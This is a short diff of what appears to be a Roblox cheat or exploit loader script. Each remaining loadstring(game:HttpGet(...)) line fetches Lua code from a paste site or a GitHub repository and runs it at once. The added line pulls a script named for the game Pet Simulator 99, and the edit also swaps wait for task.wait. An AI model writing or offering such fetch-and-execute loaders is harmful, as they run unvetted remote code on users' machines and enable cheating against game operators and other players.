@@ -1,5 +1,5 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/snItpmyGmz/0", true))()
-wait(0.1)
+task.wait(0.1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BotMark69/madebyme/refs/heads/main/loadingscreen"))()
-wait(3)
-loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
+task.wait(3)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SlamminPig/6FootScripts/main/Scripts/PetSimulator99.lua'))()
